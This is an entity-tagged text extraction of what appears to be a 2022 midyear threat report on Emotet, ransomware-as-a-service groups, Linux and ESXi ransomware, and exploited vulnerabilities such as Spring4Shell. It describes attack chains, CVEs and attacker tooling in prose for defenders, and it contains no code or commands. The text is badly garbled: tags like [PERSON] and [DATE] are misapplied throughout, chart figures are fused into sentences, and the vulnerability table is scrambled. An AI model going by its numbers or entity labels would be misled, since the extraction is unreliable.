Credential stealer module d. Network propagation moduleFigure [CARDINAL] 4 . Infection chain used in the [PERSON] Emotet infections we analyzed in [DATE] May [DATE] 20227 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity [ORG] ReportEmotet made its debut in [DATE] 2014 and is known to have been used by operators of other malware such [PERSON] asConti and [ORG] Ryuk in their attacks . In [DATE] 2021 , its infrastructure was taken down through the collaborative effortof various law enforcement agencies from different countries.7However , the dismantling of its infrastructure did not signal the end of [PERSON] Emotet . [DATE] Just [DATE] a [DATE] few [DATE] months [DATE] later , itwas observed being used in a [ORG] Trickbot campaign.8 In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 , we saw a massive uptick [PERSON] inEmotet detections compared to those in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , proof that the botnet is thriving as a resultof threat actors opting to integrate it into their operations . Indeed , researchers from [ORG] Advintel named Contioperators as one of the reasons behind [ORG] Emotet \u2019s recent resurgence.913,811148,7011H [CARDINAL] 20211H 2022030K60K90K120K150KFigure [CARDINAL] 5 . Emotet detections increased by [CARDINAL] over [CARDINAL] 10 times in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 compared to the [ORDINAL] first halfof [DATE] 2021 , likely due to prolific threat actors using it as part of their operations . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] NetworkBased on our [ORG] Smart [ORG] Protection [ORG] Network ( [ORG] SPN ) sensors , majority of the [PERSON] Emotet detections occurred [ORG] inJapan , with the [GPE] US , [GPE] India , [GPE] Italy , and [GPE] Brazil rounding up the top [CARDINAL] five . While this does not necessarilyindicate that [GPE] Japan is where [PERSON] Emotet is most active ( due to the nature of security sensors ) , it does showthat the malware has high levels of activity in the country.107,6694,8373,7293,4423,006JapanUSIndiaItalyBrazil020K40K60K80K100K120KFigure [CARDINAL] 6 . The countries with the highest number of [ORG] Emotet detectionsSource : Trend Micro Smart Protection Network8 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear [ORG] Cybersecurity ReportIn [DATE] May [DATE] 2022 , we analyzed [PERSON] Emotet infections across various regions and discovered that while the attacksstill relied on spam campaigns , it also added small changes to its routine , such as using [PRODUCT] Excel [PRODUCT] 4.0 macrosfor its downloading procedure instead of using [PERSON] Visual [PERSON] Basic [PERSON] for [PERSON] Applications ( VBA).10 Other changesthat were implemented in these recent [ORG] Emotet infections include streamlined payloads and additionalobfuscation techniques . Perhaps most importantly , the operators of [PERSON] Emotet have since added [ORG] CobaltStrike to their arsenal since the botnet \u2019s reappearance , making newer [ORG] Emotet campaigns more dangerous . [GPE] Russia - Ukraine Conflict Extends to [ORG] the [ORG] Cybercrime [ORG] SphereOn [DATE] February 24 , [DATE] 2022 , the Russia - Ukraine war began . While there has been much focus on physicalbattles on the ground , it \u2019s important to highlight that cyberattacks targeting both sides were also launchedin the ensuing chaos.11One of the prominent threat actors that became involved early on was [PERSON] Conti , which announced its supportfor the [NORP] Russian government just a day after the hostilities started . On its leak site , the group announcedthat they would strike back at groups or individuals who launched cyberattacks on [GPE] Russia , although Contiwould subsequently soften its stance in a succeeding post . Figure [CARDINAL] 7 . Initial statement from the [PERSON] Conti group warning would - be attackers of retaliation should theytarget [NORP] Russian infrastructureSPN data shows a spike in [PRODUCT] BazarLoader detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 compared to [DATE] the [DATE] first [DATE] half [DATE] ofthe [DATE] previous [DATE] year \u2014 a notable shift since [ORG] BazarLoader is a key enabler in [ORG] Conti [ORG] campaigns.9 [ORG] | [ORG] Defending [ORG] the [ORG] Expanding [ORG] Attack [ORG] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] Report756861H [ORG] 20211H 2022Figure 8 . There were [CARDINAL] nearly [CARDINAL] 10 times as many [PRODUCT] BazarLoader detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 20220200400600800compared to the first half of 2021.Source : Trend Micro Smart Protection NetworkThe Stormous ransomware gang , a group of [LANGUAGE] Arabic - speaking cybercriminals , also announced its supportfor [DATE] Russia12 and declared that it would target [NORP] Ukrainian government institutions as part of its plans . Our analysis of the malware used by Stormous reveals that the group uses it to deploy different kinds ofcustom payloads to its victim through remote uploading and resources such as Pastebin . Alongside ransomware groups becoming involved , security researchers observed attacks that , althoughnot directly connected to the ongoing war , were being launched on [NORP] Ukrainian organizations , websites , and infrastructure even before the conflict began . In [DATE] January and February 2022 , a wave of spear - phishing emails was sent to [GPE] Ukrainian targets \u2014 ostensiblyfrom [GPE] Ukrainian organizations such as [ORG] the [ORG] National [ORG] Healthcare [ORG] Service and the police force \u2014 containingattachments that download and execute the [ORG] OutSteel and [ORG] SaintBot malware.13 It \u2019s possible that thesecampaigns were carried out for information - gathering purposes as a precursor to the invasion . On [DATE] January [DATE] 13 and [DATE] 14 , [DATE] 2022 , threat actors launched a direct attack on [CARDINAL] approximately [CARDINAL] 70 [CARDINAL] Ukrainiangovernment websites , leading to the defacement of website content and system corruption via themalware WhisperGate.14 It is suspected that these attacks were enabled via the content managementsystem OctoberCMS , supply - chain attacks , and the exploitation of the Log4j vulnerability.15At [ORDINAL] first glance , these incidents belie the complexity of the attacks launched on either side of the war . Asevidenced by a [DATE] March [DATE] 2022 campaign that we analyzed , however , these cyberattacks are not a [CARDINAL] one - waystreet . In this campaign , operators used a piece of malware called [GPE] RuRansom designed to infect [NORP] Russiantargets . Although its name implies otherwise , [GPE] RuRansom is not an example of ransomware but a wiperdesigned to destroy its victim \u2019s data and backup files . Our discovery of numerous versions of RuRansomindicates that the malware is still under [PERSON] development.10 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportAlthough several ransomware groups became involved , it would be a mistake to think that ransomwaregangs were the only ones to take part in the [GPE] Russia - Ukraine war . For example , hacktivist collectiveAnonymous took part in the cyber conflict by targeting [NORP] Russian assets and information in attacks thatincluded publishing confidential files from the [NORP] Russian central bank , taking over state - controlled television , and leaking the personal data of [NORP] Russian military personnel.16Other malicious actors , while not directly targeting either side of the conflict , still attempted to capitalizeon the situation . Through our honeypot , we found war - related spam emails aiming to take advantage ofthe situation under the guise of asking for donations and using scams to create bogus recipients of suchdonations . Some of these spam emails drop malware such as [PERSON] Ave [PERSON] Maria as an attachment.17Figure 9 . A scam email asking recipients for donations to help with [GPE] Ukrainian relocations11 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity ReportThe Ransomware Threat Landscape Continues to Evolve with [ORG] New [ORG] Players [ORG] and [ORG] Lucrative [ORG] Monetization [ORG] Methods [ORG] LockBit , [PERSON] Conti , and [ORG] BlackCat [ORG] Operators [ORG] Continue to Employ the Profitable RaaS SchemeThe advent of RaaS has resulted in would - becybercriminals having access to the tools andPredictionsinfrastructure that would not have been availableWe predicted that ransomwareto them under ordinary circumstances.18 [CARDINAL] One of theoperators would implement modern andunique aspects of the RaaS model is the relationshipsophisticated extortion methods whilebetween the developers and their affiliates who actalso going after more prominent targets.as middlemen . Affiliates are also responsible for thewould grow into a formidable threat asactual infections and split ransom payment with theransomware operators continuouslydevelopers . This kind of setup provides developersintegrate it into their attacks.additional time to evolve their malware and toolswhile also affording them protection from the scrutiny of security researchers and law enforcement . Onthe other hand , affiliates profit from ransomware attacks without the extensive legwork and infrastructureneeded to initiate expansive ransomware campaigns . Our telemetry data shows that over 50 active RaaS and extortion groups and [CARDINAL] more [CARDINAL] than [CARDINAL] 1,200 organizationswere victimized by ransomware in [DATE] the [DATE] first [DATE] half of [ORG] the [ORG] year.12 [ORG] | [ORG] Defending [ORG] the [ORG] Expanding [ORG] Attack [ORG] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportActive RaaS and extortion groupsVictim organizations571,205Figure [CARDINAL] 10 . The number of active RaaS and extortion groups and victim organizations of successful03006009001.2K1.5Kransomware attacks in [DATE] the [DATE] first [DATE] half of 2022Source : RaaS and extortion groups \u2019 leak sitesLockBit , [PERSON] Conti , and [ORG] BlackCat were the major players in the RaaS field for [DATE] the [DATE] first [DATE] half of [CARDINAL] 2022.19 [ORG] Basedon [ORG] SPN data , we observed a sharp increase in detections from each of these malware families in [DATE] the [DATE] firsthalf [DATE] of [DATE] this [DATE] year . [ORG] Black [ORG] Cat , a relatively new ransomware that was initially reported at the tail end of 2021,understandably saw practically nonexistent detections in [DATE] 2021 before the increase in [DATE] 2022 . However , even older ransomware such as [ORG] LockBit and [PERSON] Conti saw major increases , with [ORG] LockBit seeing over fivetimes and [PERSON] Conti nearly twice the number of detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 in contrast to the [ORDINAL] first halfof the previous year.1H 20221H [CARDINAL] 2021LockBitContiBlackCat3411,843 [CARDINAL] 6221,090 21,39705001K1.5K2K1H 20211H 2022Figure 11 . [ORG] LockBit , [PERSON] Conti , and [ORG] BlackCat saw a significant increase in detections in [DATE] the [DATE] first [DATE] six [DATE] months [DATE] of [DATE] 2022 compared to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] previous [DATE] year : The detectionnumbers for [ORG] LockBit , [PERSON] Conti , and BlackCatSource : Trend Micro Smart Protection NetworkLockBit , which has been active since [DATE] 2019 and was initially known as the [ORG] ABCD ransomware , is thegroup with the highest number of detections.20 In [DATE] 2020 , [ORG] LockBit launched its RaaS affiliate program usinga leak site and [DATE] a [DATE] few [DATE] months [DATE] later began using the double extortion model where the attacker threatens13 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Reportto publicly expose data in addition to encrypting files . In [DATE] 2021 , [CARDINAL] one of the prominent incidents involvingLockBit occurred when it launched an attack on tech services firm Accenture , even going as far as listingthe company on its leak [DATE] site.21LockBit has been a staple in the ransomware scene since its debut , with its operators constantly evolvingits capabilities to the point where the performance of its RaaS service has become one of the group\u2019sselling points due to its speed and efficiency . [ORG] LockBit \u2019s network has also garnered popularity for itscapability and trustworthiness . LockBit offers multiple options for infection routines depending on the affiliates involved in the operation , their purpose , and how they gain access to their target \u2019s system . For example , if an affiliate managesto gain access to a virtual private network ( [ORG] VPN ) server using brute - force methods , [ORG] LockBit \u2019s operatorsmight provide an infection routine that is based on remote access service ( [ORG] RAS ) . On the other hand , thegroup might offer a [ORG] PowerShell script to attackers that gain access to a compromised Internet InformationServices ( IIS ) server . In addition to its encryption routines , [ORG] LockBit attacks were also found to havedeployed the post - exploitation tool [LOC] Mimikatz to gather additional credentials . CompromisedIIS serverPowerShellscriptBackdoor(PowerShell Empire)LockBitransomwareBrute - forced [ORG] VPN serverSMB / MicrosoftRASLockBitransomwarePowerShell commandLockBitransomwareFigure [CARDINAL] 12 . [CARDINAL] Two of the infection routines used by [ORG] LockBit : [CARDINAL] one for when its operators manage tocompromise an IIS server , and one for when they manage to compromise a [ORG] VPN server viabrute - force methodsTouted as the successor to the notorious [ORG] Ryuk ransomware,22 [PERSON] Conti hit its stride in [DATE] 2021 with a number ofprominent attacks , including incidents where it targeted healthcare institutions in [GPE] May.23Like many modern ransomware families , [PERSON] Conti employs [CARDINAL] more [CARDINAL] than [CARDINAL] one method to gain initial access toa victim \u2019s system . Phishing emails remain a common infiltration technique , with attackers using [ORG] GoogleDrive links to drop [PRODUCT] BazarLoader and the attack eventually leading to an infection . Conti can also arrive ona target \u2019s machine by exploiting vulnerabilities like the [ORG] FortiGate firewall vulnerabilities [ORG] CVE-2018 - 1337924and CVE-2018 - 13374,25 as well as various [ORG] ProxyShell [ORG] Microsoft [ORG] Exchange vulnerabilities.2614 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportOnce inside the system , tools like Whoami , [ORG] Nltest , and Net are used to provide the attackers somesystem information , such as the rights and permissions they have gained via the compromised machine . At the same time , the threat actors actively search for files that they can exfiltrate for use in their doubleextortion technique . If the attackers that deployed [PERSON] Conti find that they need to have access to greaterprivileges , they might also use exploits like [GPE] Zerologon27 for privilege escalation . In [DATE] February [DATE] 2022 , an alleged security researcher leaked some of the ransomware group \u2019s files anddocuments , revealing information such as the size and leadership of the group.28 More importantly , they unearthed the code used by [ORG] Conti operators for their components and infrastructure , such as theadministrator panel , a decryptor , and even [ORG] Conti [ORG] Locker v2.Nevertheless , the leak of such information is a double - edged sword : While it could be instrumental forresearchers to use it for keeping track of and gaining insight into [ORG] Conti \u2019s operation , malicious actors canuse the leaked source codes to build their own startup ransomware operation . [ORG] Initial [ORG] Entry and [PRODUCT] ExecutionPrivilege [PRODUCT] EscalationCommand and [ORG] ControlFirewall exploitCobalt StrikePrintNightmareZeroLogonValid accountsAnydeskPhishing [ORG] emailBazarLoader/ [ORG] BazarBackdoorCredential [ORG] AccessLateral [ORG] MovementNetwork DiscoveryNetscanShareFinderKerberoastingNet - GPPPasswordKerberoastingAnydeskProcDumpProcDumpProcDumpPSExecImpactContiLateral [ORG] Movement [ORG] andDefense [ORG] EvasionCreate scheduledtask on remote [GPE] systemsCobeacon , [GPE] KillAV , ContiKillAVEx\ufb01ltrationRcloneFigure [CARDINAL] 13 . The infection chain used in a typical [PERSON] Conti attackAlthough relatively new to the ransomware scene compared to [ORG] LockBit and [ORG] Conti , [ORG] BlackCat still managedto make waves in [DATE] the [DATE] months that it was active by going beyond the typical double extortion scheme usedby modern ransomware groups . Instead , [ORG] BlackCat resorted to a \u201c triple extortion \u201d scheme29 where it notonly threatened to encrypt files and leak sensitive data but also warned its victims that it would launchdistributed denial - of - service ( DDoS ) attacks on their infrastructure if the group \u2019s demands are not met.3015 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportBlackCat \u2019s operators typically exploit exposed and vulnerable applications to gain entry into their targetsystem . They then use [ORDINAL] third - party frameworks and toolsets such as Cobalt Strike to deliver the ransomware . In [DATE] April [DATE] 2022 , we launched an investigation into [ORG] BlackCat via [ORG] the [ORG] Trend [ORG] Micro [ORG] Vision [ORG] One \u2122 platform , wherewe gathered information about its routine . We found that the malicious actors were actively exploiting [ORG] theMicrosoft [ORG] Exchange [ORG] Server vulnerability CVE-2021 - 3120731 to insert a web shell into the victim \u2019s server forremote access . This allows the attackers the ability to remotely perform different tasks like stealing dataand dropping malicious tools . The attackers then use these tools to move laterally within the system , scanthe environment , and prepare it for eventual [ORG] BlackCat infection . Due to [ORG] BlackCat \u2019s sophistication as the [ORDINAL] first professional ransomware family to be written in Rust , a secureprogramming language that has concurrent processing capabilities , as well as its unique monetizationmethod , extensive infrastructure , and wide array of supplementary tools in its attacks , it has the potentialto become a staple in the RaaS scene in the foreseeable future . Based on both our data and data from leak sites , we were able to note that these ransomware familiesare used mainly to target small businesses with up to [CARDINAL] 200 employees at most as well as medium - sizedbusinesses with [CARDINAL] up [CARDINAL] to [CARDINAL] 1,000 employees . The likely reason for this is that these types of organizations haveless resources and a smaller workforce to properly deal with cyberattacks.32Linux Systems Become a Prime Target for Ransomware OperatorsLinux systems present an attractive target formalicious actors that are either looking to expandPredictionstheir reach or have decided to concentrate onOur [DATE] 2022 security predictions anticipatedspecific types of infrastructure , such as servers andthat ransomware threat actors wouldembedded systems where Linux is expected to seeexpend more effort on targeting servers , growth over the next few years.33server components , and related services . We observed a 75 % increase in ransomware attacks targeting Linux - based machines in [DATE] the [DATE] first [DATE] half of2022 as opposed to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , lending more evidence to our assumption that malicious actorsare focusing more of their efforts on [ORG] Linux.16 [ORG] | [ORG] Defending [ORG] the [ORG] Expanding [ORG] Attack [ORG] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report1,1211,9611H 20211H 202205001K1.5K2KFigure [CARDINAL] 14 . Linux ransomware detections grew significantly in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 as opposed to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 : A comparison of ransomware detections for Linux - based machinesSource : Trend Micro Smart Protection NetworkThe [ORG] VMware hypervisor ESXi came under heavy fire in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 . Still , there is nothing newabout cybercriminals targeting ESXi . [PERSON] RansomEXX34 , for example , has been exploiting ESXi vulnerabilitiesin its campaigns since [CARDINAL] at [CARDINAL] least [CARDINAL] 202135 \u2014 and it seems that other threat actors are now following suit . In [DATE] October [DATE] 2021 , [ORG] LockBit \u2019s operators announced a [ORG] Linux - based variant , [PERSON] LockBit [PERSON] Linux - ESXi [PERSON] Lockerversion [PERSON] 1.0 , in an underground forum . This variant targets ESXi servers through a combination of [ORG] AdvancedEncryption [ORG] Standard ( AES ) and elliptic - curve cryptography ( ECC ) algorithms to encrypt data . Since then , samples of this variant have been found in the wild . In [DATE] May [DATE] 2022 , a new ransomware variant named Cheerscrypt was also found targeting devices using [ORG] ESXi.36Based on the source code of the [NORP] Babuk ransomware that was leaked in [DATE] September [DATE] 2021,37 Cheerscryptencrypts log files and other [ORG] VMware - related files using the double extortion technique . Although neither [PERSON] LockBit [PERSON] Linux - ESXi Locker version [CARDINAL] 1.0 nor Cheerscrypt deviates from the typical doubleextortion scheme used by many other ransomware variants , the potential impact of an infection is notablein this case since ESXi servers are widely used by enterprises for server virtualization . Organizationscan also use these servers to host multiple virtual machines ( VMs ) where they keep important data . Thismeans that they are often part of an organization \u2019s critical infrastructure , and therefore any successfulattack on these components can deal great damage to an organization.17 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity ReportBig Game - Hunting Ransomware Families such as [PERSON] Black [PERSON] Basta and [ORG] Nokoyawa [ORG] Hit [ORG] Organizations [ORG] Across [ORG] the [ORG] GlobeWe spotted ransomware operators setting their sights on businesses that have the capacity to pay sizeableransom demands . Operators of the Black Basta ransomware38 struck hard and fast , hitting nearly 50organizations in a span of [DATE] a [DATE] couple [DATE] of [DATE] months in early [CARDINAL] 2022.39 [PERSON] Black [PERSON] Basta originated in [DATE] April [DATE] 2022 , whena user with the name [PERSON] Black [PERSON] Basta posted on some major underground forums that they were looking forcorporate network access credentials for organizations in [GPE] the [GPE] United [GPE] States , [GPE] Canada , [GPE] United [GPE] Kingdom , [GPE] Australia , and [GPE] New [GPE] Zealand . The user also mentioned that they were offering a share of the profits to anypotential partners . Currently , information on the scope and structure of the malicious actor \u2019s operation is limited . Given BlackBasta \u2019s initial advertisement , however , it is likely that the group uses stolen credentials to gain access toits victim \u2019s systems . It then proceeds to perform its encryption routine , [ORDINAL] first by deleting shadow copies viavssadmin.exe and then booting the device in safe mode . It then deletes the service called Fax , creates anew one using the malware \u2019s path , and adds it to the registry for persistence . Finally , it shuts down andreboots the target \u2019s machine in Safe Mode with Networking using the compromised service to encryptfiles . [CARDINAL] One of the notable characteristics of [PERSON] Black [PERSON] Basta is that its ransom note is hard - coded into themalware , suggesting that its operators could be using unique binaries for each of its victims . Figure [CARDINAL] 15 . The wallpaper created by [PERSON] Black [PERSON] Basta using the .jpg file that is droppedin the % temp% folder18 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportSecurity researchers also pointed out connections between [PERSON] Black [PERSON] Basta and other ransomware and [ORG] APTgroups . A tweet from the MalwareHunterTeam described many similarities between [PERSON] Black [PERSON] Basta [PERSON] andConti,40 while [ORG] Trend [ORG] Micro researchers managed to find correlations between [PERSON] Black [PERSON] Basta and QakBot.41In the latter part of [DATE] 2021 , the Hive ransomware initiated a spate of attacks on the [GPE] US healthcare sector , with some reports stating that over [CARDINAL] 300 organizations were hit in the ransomware \u2019s [ORDINAL] first [CARDINAL] hundred daysof operation.42 In [DATE] 2022 , we encountered [ORG] Nokoyawa , a ransomware with several similarities to Hive.43 Forexample , these ransomware families share common tools and techniques , including the use of [ORG] CobaltStrike during the arrival phase of the attack and the integration of tools such as the anti - rootkit [GPE] scannersGMER and PC [PERSON] Hunter as part of defense evasion maneuvers . However , [PERSON] Hive and [ORG] Nokoyawa also feature different characteristics , particularly in their code ( they usedifferent languages to compile the binary ) and packing method : Hive variants are packed using [ORG] UPX whileNokoyawa does not use any packer whatsoever . Most of [ORG] Nokoyawa \u2019s targets were in the [NORP] South [NORP] American region , particularly in [ORG] Argentina.19 [ORG] | [ORG] Defending [ORG] the [ORG] Expanding [ORG] Attack [ORG] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportSoftware [ORG] Vulnerabilities [ORG] Threaten [ORG] to [ORG] Disrupt [ORG] the [ORG] Operations [ORG] of [ORG] Businesses The Number of Critical- and High - Severity Vulnerabilities Increased During [DATE] the [DATE] First [DATE] Half [DATE] of [DATE] 2022The [DATE] first [DATE] half [DATE] of [DATE] 2022 saw a sizeable jump in the number of vulnerabilities published by CVE.org : [ORG] 12,380CVE [ORG] Records , a sizeable jump from the [CARDINAL] 9,420 [ORG] CVE [ORG] Records that were published during [DATE] the [DATE] first [DATE] half [DATE] of2021.44 The same trend repeated itself in the number of vulnerabilities disclosed via the [ORG] Trend [ORG] Micro [ORG] ZDIprogram , which published advisories on [CARDINAL] 944 vulnerabilities , an [PERCENT] approximately [PERCENT] 23 % increase from the [CARDINAL] 770vulnerabilities in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021.7709441H 20211H 202202004006008001KFigure 16 . There was an [PERCENT] almost [PERCENT] 23 % increase in the number of vulnerability advisories publishedin [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 compared to the same period in [DATE] the [DATE] previous [DATE] year . Source : [ORG] Trend [ORG] Micro \u2122 [ORG] Zero [ORG] Day [ORG] Initiative \u2122 [ORG] Vulnerabilities with a high - severity rating made up the greatest portion ( 68 % ) of the published vulnerabilities . Both critical- and high - severity vulnerabilities saw large increases , while medium - severity vulnerabilitieswere the only ones that saw a decrease from the same period in [CARDINAL] 2021.20 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportGiven these trends , we recommend that organizations employ an efficient , risk - based approach thatfocuses on vulnerabilities affecting their environment , then verify whether these vulnerabilities have publicproofs of concept or are being actively exploited in the wild by using resources such as [ORG] the [ORG] KnownExploited [ORG] Vulnerabilities [ORG] Catalog by the Cybersecurity and Infrastructure Security Agency ( [GPE] CISA).45800553107 [CARDINAL] 2022Figure [CARDINAL] 17 . Critical- , high- , and low - severity vulnerabilities saw an increase in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 , while medium - severity vulnerabilities experienced a slight dip : The severity breakdown , based on the [ORG] CVSS , of disclosed vulnerabilities in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 and [CARDINAL] 2022Source : Trend Micro ZDI programCVE-2017 - 14100,46 a critical - severity vulnerability that could allow shell command injections if successfullyexploited and affects certain versions of [ORG] Asterisk , an open - source software used to build communicationsapplications , had the highest number of exploit detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 based on [ORG] Trend [ORG] Micro \u2122 [ORG] TippingPoint \u00ae [ORG] Threat [ORG] Protection [ORG] System sensors . This was followed by the OpenSSL memory leak flawCVE-2014 - 3567 and the IIS web server folder traversal vulnerability CVE-2000 - 0884 , which had exploitdetections of over 9 and 4 million , respectively . The presence of these older vulnerabilities ( with exploitdetections numbering in the [CARDINAL] millions in some cases ) among the most exploited bugs in [DATE] the [DATE] first [DATE] half [DATE] ofthe [DATE] year is evidence that many organizations still have difficulty implementing crucial updates to theirsoftware . Even worse , it might mean that many organizations still completely ignore such updates . Meanwhile , CVE-2022 - 30190 ( also known as Follina),47 a high - severity remote code execution ( RCE)vulnerability affecting [ORG] Microsoft [ORG] Windows [ORG] Support [ORG] Diagnostic [ORG] Tool ( MSDT ) , has reportedly been used inattacks on high - value targets in [NORP] European countries and the US.48 [ORG] Microsoft has since patched this flawin its [DATE] June [DATE] 2022 security update.4921 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportRule IDCVE ID numberHitsAffected products29739CVE-2017 - 1410015,200,80917056CVE-2014 - 35679,107,139Asterisk 11.x before [DATE] 11.25.2 , [CARDINAL] 13.x before [DATE] 13.17.1 , and [CARDINAL] 14.x before 14.6.1 and Certified Asterisk [CARDINAL] 11.x before [CARDINAL] 11.6 - cert17 , and [CARDINAL] 13.x before 13.13 - cert5OpenSSL before 0.9.8zc , [DATE] 1.0.0 before [CARDINAL] 1.0.0o , and [DATE] 1.0.1 [DATE] earlier and [ORG] SharePoint Services [CARDINAL] 3.0 SP1 and SP2.CVE-2011 - 1264Microsoft Windows Server [DATE] 2003 SP2 and [PERSON] Server [PERSON] 2008 [PERSON] Gold , earlier and [ORG] SharePoint Services [CARDINAL] 3.0 SP1 and [ORG] SP2Microsoft [ORG] Forefront [ORG] Unified [ORG] Access [ORG] Gateway ( UAG ) [DATE] 2010 Gold , [DATE] 2010 Update [CARDINAL] 1 , and [DATE] 2010 Update 2CVE-2017 - 0068Microsoft Edge10146CVE-2010 - 2861648,690Adobe [PRODUCT] ColdFusion [PRODUCT] 9.0.1 and earlierCVE-2013 - 3336Adobe ColdFusion 9.0 , [DATE] 9.0.1 , 9.0.2 , and 1031852CVE-2014 - 0224597,386OpenSSL before 0.9.8za , [DATE] 1.0.0 before [CARDINAL] 1.0.0 m , and [DATE] 1.0.1 before 1.0.1h6161CVE-2008 - 1451580,030Microsoft Windows 2000 SP4 and Server [DATE] 2003 SP1 and SP231936CVE-2018 - 10562518,502Dasan GPON home routersTable [CARDINAL] 1 . The top vulnerabilities in terms of exploit detections in [DATE] the [DATE] first [DATE] half of [CARDINAL] 2022Source : [ORG] Trend [ORG] Micro \u2122 TippingPoint \u00ae Threat Protection SystemMajor Vulnerabilities Affect Important Business Tools and [ORG] SoftwareVulnerabilities involving critical software , tools , and components are often some of the most dangeroustypes of flaws due to the nature of what they affect . Furthermore , data from [ORG] Vision [ORG] One shows thatapproximately 85 % of all companies subscribed to the service were exposed to highly exploitablevulnerabilities.22 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportCompany countCompanies exposed to highly exploitable vulnerabilities4,8674,138Figure [CARDINAL] 18 . [CARDINAL] 4,138 out of [CARDINAL] 4,867 ( 85 % ) of all companies subscribed to [ORG] Vision [ORG] One were prone to highlyexploitable vulnerabilities : A snapshot of [ORG] Vision [ORG] One data from [DATE] the [DATE] first [DATE] week [DATE] of August 202201K2K3K4K5K2021 saw the rise of CVE-2021 - 44228 ( also known as Log4Shell),50 a vulnerability that affected the [PERSON] Java - based logging library , [PRODUCT] Apache [PRODUCT] Log4j . The disclosure of [ORG] Log4Shell shook the cybersecurity landscape dueto the ubiquity of the software it affected and its integration into different systems , which made it difficultfor organizations to determine how they were affected.51 [DATE] The [DATE] first [DATE] half [DATE] of [DATE] 2022 saw more vulnerabilitiesaffecting critical enterprise software , with perhaps the most notable being the Spring4Shell vulnerability . On [DATE] March [DATE] 31 , [DATE] 2022 , creators of [ORG] the [ORG] Spring [ORG] Framework , a widespread open - source [PERSON] Java frameworkcommonly used in enterprise applications , published information on CVE-2022 - 22965,52 a critical zero - day vulnerability ( colloquially known as Spring4Shell due to its similarities to [ORG] Log4Shell ) that affects anumber of dependencies , such as setups that run on [FAC] Spring [FAC] Framework versions before [DATE] 5.2.20 , 5.3.18,and Java Development Kit ( JDK ) [CARDINAL] 9 and higher . The Spring4Shell vulnerability typically occurs when special objects or classes are exposed to certainconditions . Attackers that want to directly access an object can do so by specifying the class variable intheir requests . In addition , access to the child properties of an object via class objects results in attackersbeing able to gain access to high - value objects in the system by following the chains of properties.53We have seen Spring4Shell being used in attackattempts in the wild as early as [DATE] April [DATE] 2022 . OnePredictionsof these attack attempts involved the exploitationIn our 2022 Security predictions , weofthe vulnerabilityto deploy cryptocurrency - anticipated that threat actors would bemining malware . In this scenario , an attacker firstable to weaponize exploits in a very shortdetermines the operating system of the targetedperiod , launching attacks even beforemachine using a string check . Once the operatingpatches can be released.system is identified , the encoded payload ( a webshell that , when decoded , results in a Spring4Shell web shell ) is executed . Afterward , a [ORG] PowerShellcommand is executed . This fetches a script designed to download and execute a cryptocurrency mineron the infected machine.5423 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] Report35K30K25K20K15K10K5K032,1895,361 [ORG] 5,299976AprDV-41108 [CARDINAL] DV-4111814,75314,0447 May8,4582,456 Threaten the [ORG] DDS [ORG] StandardThe [ORG] Data [ORG] Distribution [ORG] Service ( [ORG] DDS ) standard is an example of middleware technology that serves asthe connectivity standard for enabling secure real - time information exchange , modular applicationdevelopment , and rapid integration for the industrial internet of things ( IIoT).62 [ORG] DDS is used to implement areliable communication layer between sensors , controllers , and actuators in areas such as transportation , robotics , telecommunications , healthcare , and defense , making it a critical type of middleware technologydespite not being widely known to the public . In addition to the importance of [ORG] DDS in the software supply chain , it \u2019s also worth noting that its locationat the beginning of the chain makes it easy to lose track of . As a result , malicious actors see [ORG] DDS as anattractive target . Since it serves as a security - critical building block of the system , the exploitation of asingle vulnerability has the potential to leave an impact on the rest of the software stack . In [DATE] January [DATE] 2022 , [ORG] Trend [ORG] Micro [ORG] Research , [ORG] TXOne [ORG] Networks , and ZDI in collaboration with [PERSON] ADLINK [PERSON] Labs andAlias Robotics published an entry discussing [ORG] DDS from a 